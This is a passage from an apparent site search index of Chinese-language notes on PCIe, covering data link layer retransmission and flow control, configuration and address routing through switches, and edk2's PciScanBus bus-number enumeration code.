Sequence Number \u200b\u548c\u200b LCRC\uff0c\u200b\u7136\u540e\u200b\u4f1a\u200b\u4fdd\u5b58\u200b\u5728\u200b retry buffer \u200b\u4e2d\u200b\uff0c\u200b\u901a\u8fc7\u200b Physical Layer \u200b\u53d1\u9001\u200b\u3002\u200b\u4ece\u200b Physical Layer \u200b\u6536\u5230\u200b\u65b0\u200b\u7684\u200b TLP/DLLP \u200b\u65f6\u200b\uff0c\u200b\u4f1a\u200b\u68c0\u67e5\u200b\u5b83\u200b\u7684\u200b\u5b8c\u6574\u6027\u200b\uff08CRC\uff09\uff0c\u200b\u5982\u679c\u200b\u6b63\u786e\u200b\uff0c\u200b\u5c31\u200b\u5411\u200b\u53d1\u9001\u200b\u65b9\u200b\u53d1\u9001\u200b\u4e00\u4e2a\u200b Ack DLLP\uff0c\u200b\u5e76\u200b\u628a\u200b TLP \u200b\u63d0\u4ea4\u200b\u7ed9\u200b Transaction Layer\uff1b\u200b\u5982\u679c\u200b\u4e0d\u200b\u6b63\u786e\u200b\uff0c\u200b\u5c31\u200b\u5411\u200b\u53d1\u9001\u200b\u65b9\u200b\u53d1\u9001\u200b\u4e00\u4e2a\u200b Nak DLLP\u3002\u200b\u5982\u679c\u200b\u6536\u5230\u200b\u4e86\u200b Ack DLLP\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u628a\u200b\u76f8\u5e94\u200b\u7684\u200b TLP \u200b\u4ece\u200b retry buffer \u200b\u4e2d\u200b\u5220\u6389\u200b\uff1b\u200b\u5982\u679c\u200b\u6536\u5230\u200b\u4e86\u200b Nak DLLP\uff0c\u200b\u5219\u200b\u8981\u200b\u91cd\u4f20\u200b\u3002\u200b\u8fd9\u6837\u200b\u5c31\u200b\u5b9e\u73b0\u200b\u4e86\u200b TLP \u200b\u7684\u200b\u53ef\u9760\u200b\u4f20\u8f93\u200b\u3002</p> <p>\u200b\u9700\u8981\u200b\u6ce8\u610f\u200b\u7684\u200b\u662f\u200b\uff0cTLP \u200b\u548c\u200b DLLP \u200b\u7684\u200b\u533a\u522b\u200b\uff1aTLP \u200b\u5c31\u200b\u50cf\u200b IP\uff0c\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u8de8\u8d8a\u200b\u591a\u200b\u8df3\u200b\uff1b\u200b\u800c\u200b DLLP \u200b\u662f\u200b\u70b9\u5bf9\u70b9\u200b\u5730\u200b\u5de5\u4f5c\u200b\uff0c\u200b\u6240\u4ee5\u200b\u4e00\u4e2a\u200b TLP \u200b\u5728\u200b\u8f6c\u53d1\u200b\u7684\u200b\u6bcf\u200b\u4e00\u200b\u8df3\u200b\u4e2d\u200b\uff0c\u200b\u63a5\u53d7\u65b9\u200b\u90fd\u200b\u4f1a\u200b\u53d1\u9001\u200b\u4e00\u6b21\u200b Ack DLLP\u3002</p> <p>Data Link Layer \u200b\u7684\u200b\u6d41\u91cf\u200b\u662f\u200b Credit-based \u200b\u7684\u200b\uff1a\u200b\u63a5\u53d7\u65b9\u200b\u4f1a\u200b\u544a\u8bc9\u200b\u53d1\u9001\u200b\u65b9\u200b\u81ea\u5df1\u200b\u7684\u200b Buffer \u200b\u8fd8\u6709\u200b\u591a\u5c11\u200b\u7a7a\u95f4\u200b\uff08Credit\uff09\uff0c\u200b\u7136\u540e\u200b\u53d1\u9001\u200b\u65b9\u200b\u6839\u636e\u200b Credit \u200b\u6765\u200b\u63a7\u5236\u200b\u662f\u5426\u200b\u7ee7\u7eed\u200b\u53d1\u9001\u200b TLP\u3002</p>"},{"location":"hardware/pcie.html#_2","title":"\u914d\u7f6e","text":"<p>\u200b\u63a5\u89e6\u200b PCIe \u200b\u7684\u200b\u65f6\u5019\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u6709\u200b\u4e00\u4e2a\u200b\u7591\u60d1\u200b\uff0c\u200b\u5c31\u662f\u200b\u8fd9\u4e9b\u200b Bus Device Function \u200b\u90fd\u200b\u662f\u200b\u600e\u4e48\u200b\u5206\u914d\u200b\u7684\u200b\uff0c\u200b\u5206\u914d\u200b\u5b8c\u200b\u4e4b\u540e\u200b\uff0c\u200b\u8bbf\u95ee\u200b\u8bf7\u6c42\u200b\u53c8\u200b\u662f\u200b\u600e\u4e48\u200b\u8def\u7531\u200b\u7684\u200b\u3002</p>"},{"location":"hardware/pcie.html#_3","title":"\u8def\u7531","text":"<p>\u200b\u9996\u5148\u200b\u56de\u987e\u200b\u4e00\u4e0b\u200b\uff0c\u200b\u4e0a\u9762\u200b\u63d0\u5230\u200b\u4e86\u200b TLP \u200b\u7684\u200b Memory \u200b\u548c\u200b IO \u200b\u662f\u200b\u6839\u636e\u200b\u5730\u5740\u200b\u8def\u7531\u200b\uff0cConfiguration \u200b\u662f\u200b\u6839\u636e\u200b Bus Device Function \u200b\u8def\u7531\u200b\uff0c\u200b\u800c\u200b PCIe \u200b\u5927\u6982\u200b\u662f\u200b\u4e00\u4e2a\u200b\u6811\u5f62\u200b\u7684\u200b\u7ed3\u6784\u200b\uff0c\u200b\u53f6\u5b50\u200b\u7ed3\u70b9\u200b\u5c31\u662f\u200b PCIe \u200b\u8bbe\u5907\u200b\uff0c\u200b\u975e\u200b\u53f6\u5b50\u200b\u7ed3\u70b9\u200b\u662f\u200b\u6865\u200b\u6216\u8005\u200b\u4ea4\u6362\u673a\u200b\u3002\u200b\u56de\u60f3\u200b\u4e00\u4e0b\u200b\uff0cIP \u200b\u7684\u200b\u8def\u7531\u200b\u662f\u200b\u6309\u7167\u200b\u6700\u957f\u200b\u524d\u7f00\u200b\u5339\u914d\u200b\uff0c\u200b\u5982\u679c\u200b\u5728\u200b PCIe \u200b\u4e2d\u200b\u8fd8\u200b\u8fd9\u6837\u200b\u505a\u200b\u7684\u8bdd\u200b\uff0c\u200b\u53c8\u200b\u592a\u200b\u8fc7\u4e8e\u200b\u590d\u6742\u200b\u4e86\u200b\uff0c\u200b\u6bd5\u7adf\u200b PCIe \u200b\u53ef\u4ee5\u200b\u4eba\u4e3a\u200b\u5730\u200b\u8bbe\u5b9a\u200b\u6bcf\u4e2a\u200b\u8bbe\u5907\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u8ba9\u200b\u5730\u5740\u200b\u6ee1\u8db3\u200b\u4e00\u5b9a\u200b\u7684\u200b\u8fde\u7eed\u6027\u200b\u548c\u200b\u5c40\u90e8\u6027\u200b\uff0c\u200b\u8fd9\u6837\u200b\u8def\u7531\u200b\u9009\u62e9\u200b\u5c31\u200b\u975e\u5e38\u7b80\u5355\u200b\u4e86\u200b\u3002</p> <p>\u200b\u89c2\u5bdf\u200b PCIe \u200b\u6807\u51c6\u200b\u4e2d\u200b 7.3.3 Configuration Request Routing Rules\uff0c\u200b\u7ed3\u5408\u200b MindShare \u200b\u7684\u200b\u4e66\u200b\uff0c\u200b\u770b\u200b Root Ports\uff0cSwitches \u200b\u548c\u200b Bridges \u200b\u7684\u200b\u8981\u6c42\u200b\uff0c\u200b\u5c31\u200b\u77e5\u9053\u200b Configuration \u200b\u8bf7\u6c42\u200b\u662f\u200b\u5982\u4f55\u200b\u8def\u7531\u200b\u7684\u200b\uff1a</p> <ul> <li>Configuration \u200b\u8bf7\u6c42\u200b\u53ea\u80fd\u200b\u7531\u200b Host Bridge \u200b\u53d1\u8d77\u200b</li> <li>\u200b\u5982\u679c\u200b Configuration \u200b\u8bf7\u6c42\u200b\u662f\u200b Type0\uff0c\u200b\u90a3\u4e48\u200b\u8fd9\u4e2a\u200b\u8bf7\u6c42\u200b\u7684\u200b\u76ee\u7684\u200b\u8bbe\u5907\u200b\u5c31\u662f\u200b\u5f53\u524d\u200b\u8bbe\u5907\u200b</li> <li>\u200b\u5982\u679c\u200b Configuration \u200b\u8bf7\u6c42\u200b\u662f\u200b Type1\uff0c<ul> <li>\u200b\u5982\u679c\u200b\u8bf7\u6c42\u200b\u7684\u200b Bus Number \u200b\u7b49\u4e8e\u200b\u67d0\u200b\u4e00\u4e2a\u200b Downstream Port \u200b\u7684\u200b Secondary Bus Number\uff0c\u200b\u5219\u200b\u628a\u200b Configuration \u200b\u8bf7\u6c42\u200b\u8f6c\u6362\u200b\u4e3a\u200b Type0\uff0c\u200b\u7136\u540e\u200b\u53d1\u7ed9\u200b\u8be5\u200b Downstream Port</li> <li>\u200b\u5982\u679c\u200b\u4e0d\u200b\u7b49\u4e8e\u200b\uff0c\u200b\u4f46\u662f\u200b Bus Number \u200b\u5c5e\u4e8e\u200b\u67d0\u200b\u4e00\u4e2a\u200b Downstream Port \u200b\u7684\u200b Secondary Bus Number \u200b\u548c\u200b Subordinate Bus Number \u200b\u4e4b\u95f4\u200b\uff0c\u200b\u5219\u200b\u4e0d\u200b\u4fee\u6539\u200b Configuration \u200b\u8bf7\u6c42\u200b\uff0c\u200b\u53d1\u9001\u7ed9\u200b\u8be5\u200b Downstream Port\u3002</li> </ul> </li> </ul> <p>\u200b\u5982\u679c\u200b\u7c7b\u6bd4\u200b\u4e00\u4e0b\u200b IP\uff0c\u200b\u90a3\u4e48\u200b\u5206\u7ec4\u200b\u5728\u200b\u4e2d\u9014\u200b\u8def\u7531\u5668\u200b\u8f6c\u53d1\u200b\u7684\u200b\u65f6\u5019\u200b\u5c31\u662f\u200b Type1\uff0cType0 \u200b\u5c31\u662f\u200b\u6700\u540e\u200b\u4e00\u8df3\u200b\u3002\u200b\u8def\u7531\u200b\u5c31\u662f\u200b\u76f4\u63a5\u200b\u6309\u7167\u200b\u51e0\u4e2a\u200b\u4e0d\u200b\u91cd\u5408\u200b\u7684\u200b Bus Number \u200b\u533a\u95f4\u200b\u8fdb\u884c\u200b\u5224\u65ad\u200b\uff0c\u200b\u6ca1\u6709\u200b\u590d\u6742\u200b\u7684\u200b\u6700\u957f\u200b\u524d\u7f00\u200b\u5339\u914d\u200b\u3002\u200b\u4f46\u662f\u200b\u53c8\u200b\u6709\u200b\u4e00\u4e2a\u200b\u95ee\u9898\u200b\uff0c\u200b\u5982\u679c\u200b\u6309\u7167\u200b Bus \u200b\u8def\u7531\u200b\uff0c\u200b\u90a3\u200b\u540c\u4e00\u4e2a\u200b Bus \u200b\u4e0b\u200b\u4e0d\u540c\u200b\u7684\u200b Device \u200b\u548b\u529e\u200b\uff1f\u200b\u8fd9\u200b\u5c31\u200b\u50cf\u662f\u200b\u4ee5\u592a\u7f51\u200b\uff0c\u200b\u6700\u540e\u200b\u4e00\u8df3\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5982\u679c\u200b\u540c\u4e00\u4e2a\u200b\u94fe\u8def\u200b\u4e0a\u200b\u6709\u200b\u591a\u4e2a\u200b\u8bbe\u5907\u200b\uff0c\u200b\u90a3\u4e48\u200b\u591a\u4e2a\u200b\u8bbe\u5907\u200b\u90fd\u200b\u80fd\u200b\u6536\u5230\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u8bbe\u5907\u200b\u6839\u636e\u200b\u81ea\u5df1\u200b\u7684\u200b Device \u200b\u53f7\u200b\u5224\u65ad\u200b\u662f\u5426\u662f\u200b\u53d1\u7ed9\u200b\u81ea\u5df1\u200b\u7684\u200b\u3002PCI\uff08\u200b\u6ce8\u610f\u200b\u4e0d\u662f\u200b PCIe\uff09\u200b\u603b\u7ebf\u200b\u4e5f\u200b\u7c7b\u4f3c\u200b\u3002\u200b\u968f\u7740\u200b\u901f\u5ea6\u200b\u8d8a\u6765\u8d8a\u200b\u9ad8\u200b\uff0c\u200b\u901a\u8fc7\u200b\u4ea4\u6362\u673a\u200b\uff0c\u200b\u4ee5\u592a\u7f51\u200b\u5df2\u7ecf\u200b\u53d8\u6210\u200b\u4e86\u200b\u70b9\u5bf9\u70b9\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5f88\u5c11\u200b\u89c1\u5230\u200b\u4e00\u4e2a\u200b\u94fe\u8def\u200b\u4e0a\u200b\u540c\u65f6\u200b\u6709\u200b\u591a\u4e2a\u200b\u8bbe\u5907\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e86\u200b\u3002PCIe \u200b\u4e5f\u200b\u4e00\u6837\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6839\u636e\u200b Bus \u200b\u8def\u7531\u200b\u5c31\u200b\u8db3\u591f\u200b\u4e86\u200b\u3002\u200b\u81f3\u4e8e\u200b lspci \u200b\u770b\u5230\u200b\u7684\u200b\u90a3\u4e9b\u200b Device \u200b\u4e0d\u200b\u7b49\u4e8e\u200b 0 \u200b\u7684\u200b\u8bbe\u5907\u200b\uff0c\u200b\u8981\u4e48\u200b\u662f\u200b\u517c\u5bb9\u200b PCI \u200b\u8bbe\u5907\u200b\u7684\u200b\uff0c\u200b\u8981\u4e48\u200b\u662f\u200b\u865a\u62df\u200b\u7684\u200b\uff0c\u200b\u5728\u200b\u8bbe\u5907\u200b\u5185\u90e8\u200b\u8fdb\u884c\u200b\u8def\u7531\u200b\u7684\u200b\uff0c\u200b\u5e76\u200b\u4e0d\u662f\u200b\u771f\u7684\u200b\u6709\u200b\u4e00\u4e2a\u200b PCIe link \u200b\u8fde\u200b\u4e86\u200b\u591a\u4e2a\u200b\u7269\u7406\u200b\u8bbe\u5907\u200b\u3002</p> <p>\u200b\u6240\u4ee5\u200b\u7b80\u5355\u200b\u7406\u89e3\u200b\u4e00\u4e0b\u200b\uff0cPCI \u200b\u603b\u7ebf\u200b\u786e\u5b9e\u200b\u662f\u200b\u4e00\u6761\u200b\u603b\u7ebf\u200b\uff0c\u200b\u4e00\u6761\u200b\u603b\u7ebf\u200b\u4e0a\u200b\u5f88\u591a\u200b\u8bbe\u5907\u200b\u3002\u200b\u800c\u200b PCIe \u200b\u5b9e\u9645\u4e0a\u200b\u662f\u200b\u4e00\u4e2a\u200b\u7f51\u7edc\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u4f5c\u200b\u662f\u200b\u5f88\u591a\u200b\u4e2a\u200b PCI \u200b\u603b\u7ebf\u200b\u8fde\u63a5\u200b\u5728\u200b\u4e00\u8d77\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u628a\u200b Root Complex \u200b\u6216\u8005\u200b Switch \u200b\u5185\u90e8\u200b\u770b\u6210\u200b\u4e00\u4e2a\u200b\u865a\u62df\u200b\u7684\u200b\u6709\u200b\u5f88\u591a\u200b\u8bbe\u5907\u200b\u7684\u200b PCI \u200b\u603b\u7ebf\u200b\uff0c\u200b\u800c\u200b PCIe Link \u200b\u53ef\u4ee5\u200b\u770b\u6210\u200b\u662f\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b\u8bbe\u5907\u200b\u7684\u200b PCI \u200b\u603b\u7ebf\u200b\u3002\u200b\u8fd9\u6837\u200b PCIe \u200b\u4ea4\u6362\u673a\u200b\u53ef\u4ee5\u200b\u770b\u6210\u200b\u82e5\u5e72\u4e2a\u200b PCI-PCI Bridge\uff1a</p> <p> </p> PCIe \u200b\u4ea4\u6362\u673a\u200b\u548c\u200b Root Complex \u200b\u5185\u90e8\u200b\u56fe\u89e3\u200b\uff08\u200b\u56fe\u6e90\u200b PCIe 3.0 \u200b\u6807\u51c6\u200b\uff09 <p>\u200b\u8fd8\u6709\u200b MindShare \u200b\u4e66\u4e2d\u200b\u7684\u200b\u56fe\u200b 3-5:</p> <p> </p> PCIe \u200b\u5b8c\u6574\u200b\u62d3\u6251\u200b\uff08\u200b\u56fe\u6e90\u200b MineShare PCIe 3.0 \u200b\u4e66\u200b\uff09 <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u7684\u200b\u6bcf\u200b\u4e00\u4e2a\u200b Bus \u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b PCI \u200b\u603b\u7ebf\u200b\uff0c\u200b\u65e2\u6709\u200b\u5185\u90e8\u200b\u7684\u200b\u865a\u62df\u200b PCI \u200b\u603b\u7ebf\u200b\uff08Bus 0/2/6\uff09\uff0c\u200b\u4e5f\u200b\u6709\u200b PCIe Link \u200b\u5145\u5f53\u200b\u7684\u200b PCI \u200b\u603b\u7ebf\u200b\uff08Bus 1/3/4/5/7/8/9\uff09\u3002\u200b\u5728\u200b\u865a\u62df\u200b\u7684\u200b PCI \u200b\u603b\u7ebf\u200b\u91cc\u200b\uff0c\u200b\u6bd4\u5982\u200b PCIe Switch\uff0c\u200b\u4e00\u4e2a\u200b Device \u200b\u5bf9\u5e94\u200b\u4e00\u4e2a\u200b Downstream Port\uff1b\u200b\u800c\u200b PCIe Link \u200b\u5bf9\u5e94\u200b\u7684\u200b PCI \u200b\u603b\u7ebf\u200b\u4e0a\u200b\u5c31\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b Device\u3002\u200b\u7136\u540e\u200b PCIe Switch \u200b\u7684\u200b\u6bcf\u4e2a\u200b Upstream Port \u200b\u548c\u200b Downstream Port \u200b\u91cc\u4f1a\u200b\u8bb0\u5f55\u200b\u4e09\u4e2a\u200b Bus Number\uff1aPrimary(Pri)\uff0cSecondary(Sec) \u200b\u548c\u200b Subordinate(Sub)\u3002Primary \u200b\u6307\u200b\u7684\u200b\u5c31\u662f\u200b\u5b83\u200b\u4e0a\u6e38\u200b\u76f4\u63a5\u200b\u8fde\u63a5\u200b\u7684\u200b PCI \u200b\u603b\u7ebf\u200b\u7f16\u53f7\u200b\uff0cSec \u200b\u6307\u200b\u7684\u200b\u662f\u200b\u4e0b\u6e38\u200b\u76f4\u63a5\u200b\u8fde\u63a5\u200b\u7684\u200b PCI \u200b\u603b\u7ebf\u200b\u7f16\u53f7\u200b\uff0cSub \u200b\u6307\u200b\u7684\u200b\u662f\u200b\u5b83\u200b\u4e0b\u6e38\u200b\u7684\u200b\u6700\u5927\u200b PCI \u200b\u603b\u7ebf\u200b\u7f16\u53f7\u200b\u3002</p> <p>\u200b\u8fd9\u6837\u200b\uff0c\u200b\u6536\u5230\u200b Type1 \u200b\u7684\u200b\u65f6\u5019\u200b\uff0cSwitch \u200b\u6309\u7167\u200b\u5404\u4e2a\u200b Downstream Port \u200b\u7684\u200b Sec \u200b\u548c\u200b Sub \u200b\u8fdb\u884c\u200b\u5224\u65ad\u200b\uff0c\u200b\u5982\u679c\u200b\u76ee\u6807\u200b Bus Number \u200b\u7b49\u4e8e\u200b Sec\uff0c\u200b\u5c31\u200b\u8f6c\u6362\u200b\u4e3a\u200b Type0 \u200b\u53d1\u51fa\u200b\u53bb\u200b\uff1b\u200b\u5982\u679c\u200b\u5927\u4e8e\u200b Sec\uff0c\u200b\u4f46\u662f\u200b\u5c0f\u4e8e\u200b\u6216\u200b\u7b49\u4e8e\u200b Sub\uff0c\u200b\u5c31\u200b\u539f\u6837\u200b\u53d1\u51fa\u200b\u53bb\u200b\u3002\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u4ece\u200b Host Bridge \u200b\u5230\u200b\u6bcf\u4e2a\u200b\u8bbe\u5907\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u8fd9\u6837\u200b\u7684\u200b\u65b9\u5f0f\u200b\u4e00\u8def\u200b\u8f6c\u53d1\u200b\u3002</p> <p>\u200b\u65e2\u7136\u200b BDF \u200b\u662f\u200b\u628a\u200b Bus \u200b\u5212\u5206\u200b\u4e3a\u200b\u591a\u4e2a\u200b\u533a\u95f4\u200b\u6765\u200b\u8def\u7531\u200b\u7684\u200b\uff0c\u200b\u90a3\u4e48\u200b Memory \u200b\u548c\u200b IO \u200b\u8bf7\u6c42\u200b\u4e5f\u200b\u7c7b\u4f3c\u200b\u5730\u200b\u53ef\u4ee5\u200b\u5bf9\u200b\u5730\u5740\u200b\u8fdb\u884c\u200b\u5212\u5206\u200b\uff0c\u200b\u53d8\u6210\u200b\u591a\u4e2a\u200b\u533a\u95f4\u200b\uff0c\u200b\u7136\u540e\u200b\u7528\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u65b9\u6cd5\u200b\u8fdb\u884c\u200b\u8def\u7531\u200b\u3002</p> <p>\u200b\u8fd9\u4e9b\u200b\u7528\u4e8e\u200b\u8def\u7531\u200b\u7684\u200b\u533a\u95f4\u200b\u4e0a\u200b\u4e0b\u754c\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b\u5404\u4e2a\u200b\u7aef\u53e3\u200b\u7684\u200b Type1 Configuration Space \u200b\u4e2d\u200b\u627e\u5230\u200b\uff1a</p> <p> </p> PCIe Type1 Configuration Space\uff08\u200b\u56fe\u6e90\u200b PCIe 3.0 \u200b\u6807\u51c6\u200b\uff09 <ul> <li>\u200b\u8def\u7531\u200b Type1 Configuration Request\uff1aPrimary Bus Number, Secondary Bus Number, Subordinate Bus Number<ul> <li><code>Request Bus Number == Secondary Bus Number</code>: Type1 -&gt; Type0</li> <li><code>Secondary Bus Number &lt; Request Bus Number &lt;= Subordinate Bus Number</code>: Type1 -&gt; Type1</li> </ul> </li> <li>\u200b\u8def\u7531\u200b IO Request\uff1a<code>I/O Base &lt;= IO Address &lt;= I/O Limit</code></li> <li>\u200b\u8def\u7531\u200b Prefetchable Memory Request\uff1a<code>Prefetchable Memory Base &lt;= Memory Address &lt;= Prefetchable Memory Limit</code></li> <li>\u200b\u8def\u7531\u200b Non-Prefetchable Memory Request\uff1a<code>Memory Base &lt;= Memory Address &lt;= Memory Limit</code></li> </ul> <p>\u200b\u800c\u200b\u5177\u4f53\u200b\u5230\u200b\u6bcf\u200b\u4e00\u4e2a\u200b\u8bbe\u5907\u200b\u4e0a\u200b\uff0c\u200b\u8bbe\u5907\u200b\u4f1a\u200b\u63d0\u4f9b\u200b\u82e5\u5e72\u4e2a\u200b BAR\uff08Base Address Register\uff09\uff0c\u200b\u5728\u200b\u679a\u4e3e\u200b\u8bbe\u5907\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u200b\u7ed9\u200b BAR \u200b\u5206\u914d\u200b\u5730\u5740\u200b\uff0c\u200b\u7136\u540e\u200b\u628a\u200b\u8bbe\u5907\u200b\u7684\u200b\u5730\u5740\u200b\u8fdb\u884c\u200b\u5408\u5e76\u200b\uff0c\u200b\u8bb0\u5f55\u200b\u5230\u200b Switch \u200b\u4e0a\u200b\u7684\u200b Base \u200b\u548c\u200b Limit\uff0c\u200b\u7136\u540e\u200b\u4e00\u76f4\u200b\u9012\u5f52\u200b\uff0c\u200b\u4e00\u8def\u200b\u66f4\u65b0\u200b\u5230\u200b Root Complex\u3002\u200b\u8fd9\u6837\u200b\uff0c\u200b\u5c31\u200b\u5b8c\u6210\u200b\u4e86\u200b\u5730\u5740\u200b\u5206\u914d\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u8bf7\u6c42\u200b\u7684\u200b\u8def\u7531\u200b\u3002</p>"},{"location":"hardware/pcie.html#_4","title":"\u5206\u914d","text":"<p>\u200b\u65e2\u7136\u200b\u77e5\u9053\u200b\u4e86\u200b BDF \u200b\u662f\u200b\u5982\u4f55\u200b\u8def\u7531\u200b\u7684\u200b\uff0c\u200b\u90a3\u4e48\u200b\u63a5\u4e0b\u6765\u200b\u7684\u200b\u95ee\u9898\u200b\u662f\u200b\uff0c\u200b\u600e\u4e48\u200b\u679a\u4e3e\u200b\u8bbe\u5907\u200b\u548c\u200b\u4ea4\u6362\u673a\u200b\uff0c\u200b\u5206\u914d\u200b Bus Number\u3002\u200b\u8fd9\u4e2a\u200b\u4e8b\u60c5\u200b\u5728\u200b\u7cfb\u7edf\u542f\u52a8\u200b\u7684\u200b\u65f6\u5019\u200b\u4f1a\u200b\u505a\u200b\uff08\u200b\u4f8b\u5982\u200b UEFI\uff09\uff0cLinux \u200b\u4e2d\u200b\u4e5f\u200b\u6709\u200b\u76f8\u5173\u200b\u7684\u200b\u4ee3\u7801\u200b\u3002\u200b\u4e0b\u9762\u200b\u5c31\u200b\u6765\u200b\u5bf9\u200b\u7740\u200b edk2 \u200b\u7684\u200b\u6e90\u4ee3\u7801\u200b\u6765\u200b\u770b\u770b\u200b\u5b83\u200b\u662f\u200b\u600e\u4e48\u200b\u505a\u200b\u7684\u200b\u3002</p> <p>\u200b\u5728\u200b edk2 \u200b\u4e2d\u200b\uff0c\u200b\u5206\u914d\u200b Bus Number \u200b\u7684\u200b\u6838\u5fc3\u200b\u4ee3\u7801\u200b\u662f\u200b <code>PciScanBus</code> \u200b\u51fd\u6570\u200b\uff1a</p> <pre><code>/**\n  Scan pci bus and assign bus number to the given PCI bus system.\n\n  @param  Bridge           Bridge device instance.\n  @param  StartBusNumber   start point.\n  @param  SubBusNumber     Point to sub bus number.\n  @param  PaddedBusRange   Customized bus number.\n\n  @retval EFI_SUCCESS      Successfully scanned and assigned bus number.\n  @retval other            Some error occurred when scanning pci bus.\n\n  @note   Feature flag PcdPciBusHotplugDeviceSupport determine whether need support hotplug.\n\n**/\nEFI_STATUS\nPciScanBus (\n  IN PCI_IO_DEVICE  *Bridge,\n  IN UINT8          StartBusNumber,\n  OUT UINT8         *SubBusNumber,\n  OUT UINT8         *PaddedBusRange\n  );\n</code></pre> <p>\u200b\u8f93\u5165\u200b\u4e00\u4e2a\u200b\u6865\u200b\u8bbe\u5907\u200b\u548c\u200b\u521d\u59cb\u200b\u7684\u200b Bus Number\uff0c\u200b\u8f93\u51fa\u200b Subordinate Bus Number\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u5206\u914d\u200b\u7684\u200b\u6700\u5927\u200b\u7684\u200b Bus Number\uff0c\u200b\u4ee5\u53ca\u200b Padded Bus Range\uff0c\u200b\u4f8b\u5982\u200b\u5982\u679c\u200b\u8981\u200b\u8003\u8651\u200b\u70ed\u63d2\u62d4\u200b\u7684\u8bdd\u200b\uff0c\u200b\u5c31\u200b\u9700\u8981\u200b\u9884\u7559\u200b\u4e00\u4e9b\u200b Bus Number\u3002\u200b\u5b83\u200b\u5728\u200b <code>PciRootBridgeEnumerator</code> \u200b\u51fd\u6570\u200b\u4e2d\u200b\u88ab\u200b\u8c03\u7528\u200b\uff0c\u200b\u4f20\u5165\u200b\u7684\u200b\u662f\u200b RootBridgeDev\u3002\u200b\u4f60\u200b\u53ef\u80fd\u200b\u4e5f\u200b\u731c\u200b\u5230\u200b\u4e86\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u51fd\u6570\u200b\u53ef\u4ee5\u200b\u9012\u5f52\u200b\u8c03\u7528\u200b\uff0c\u200b\u4ece\u200b Root Bridge \u200b\u5f00\u59cb\u200b\u5f80\u200b\u4e0b\u200b\uff0c\u200b\u9047\u5230\u200b\u65b0\u200b\u7684\u200b\u6865\u200b\u8bbe\u5907\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5c31\u200b\u7ee7\u7eed\u200b\u9012\u5f52\u200b\uff0c\u200b\u7136\u540e\u200b\u6839\u636e\u200b\u4e0b\u200b\u4e00\u5c42\u200b\u5206\u914d\u200b\u7684\u200b Bus Number \u200b\u6765\u200b\u8ba1\u7b97\u200b\u4e0a\u200b\u4e00\u5c42\u200b\u7684\u200b Subordinate Bus Number\u3002</p> <p><code>PciScanBus</code> \u200b\u9996\u5148\u200b\u679a\u4e3e\u200b\u5f53\u524d\u200b\u6865\u200b\u8bbe\u5907\u200b\u4e0b\u200b\u7684\u200b\u6240\u6709\u200b Device \u200b\u548c\u200b Function\uff0c\u200b\u56e0\u4e3a\u200b\u5f53\u524d\u200b\u7684\u200b\u6865\u200b\u8bbe\u5907\u200b\u5df2\u7ecf\u200b\u88ab\u200b\u5206\u914d\u200b\u4e86\u200b Bus Number\uff0c\u200b\u6240\u4ee5\u200b\u662f\u200b\u53ef\u4ee5\u200b\u8bbf\u95ee\u200b\u5b83\u200b\u4e0b\u9762\u200b\u7684\u200b Device \u200b\u548c\u200b Function \u200b\u7684\u200b\u3002</p> <pre><code>for (Device = 0; Device &lt;= PCI_MAX_DEVICE; Device++) {\n  TempReservedBusNum = 0;\n  for (Func = 0; Func &lt;= PCI_MAX_FUNC; Func++) {\n    //\n    // Check to see whether a pci device is present\n    //\n    Status =\n        PciDevicePresent(PciRootBridgeIo, &amp;Pci, StartBusNumber, Device, Func);\n\n    if (EFI_ERROR(Status) &amp;&amp; (Func == 0)) {\n      //\n      // go to next device if there is no Function 0\n      //\n      break;\n    }\n\n    if (EFI_ERROR(Status)) {\n      continue;\n    }\n\n    //\n    // Get the PCI device information\n    //\n    Status =\n        PciSearchDevice(Bridge, &amp;Pci, StartBusNumber, Device, Func, &amp;PciDevice);\n\n    if (EFI_ERROR(Status)) {\n      continue;\n    }\n\n    PciAddress = EFI_PCI_ADDRESS(StartBusNumber, Device, Func, 0);\n\n    if (IS_PCI_BRIDGE(&amp;Pci) || IS_CARDBUS_BRIDGE(&amp;Pci)) {\n      //\n      // For PPB\n      //\n\n      Status = PciAllocateBusNumber(Bridge, *SubBusNumber, 1, SubBusNumber);\n      if (EFI_ERROR(Status)) {\n        return Status;\n      }\n\n      SecondBus = *SubBusNumber;\n\n      Register = (UINT16)((SecondBus &lt;&lt; 8) | (UINT16)StartBusNumber);\n      Address = EFI_PCI_ADDRESS(StartBusNumber, Device, Func,\n                                PCI_BRIDGE_PRIMARY_BUS_REGISTER_OFFSET);\n\n      Status = PciRootBridgeIo-&gt;Pci.Write(PciRootBridgeIo, EfiPciWidthUint16,\n                                          Address, 1, &amp;Register);\n\n      //\n      // If it is PPB, recursively search down this bridge\n      //\n      if (IS_PCI_BRIDGE(&amp;Pci)) {\n        //\n        // Temporarily initialize SubBusNumber to maximum bus number to ensure\n        // the PCI configuration transaction to go through any PPB\n        //\n        Register = PciGetMaxBusNumber(Bridge);\n        Address = EFI_PCI_ADDRESS(StartBusNumber, Device, Func,\n                                  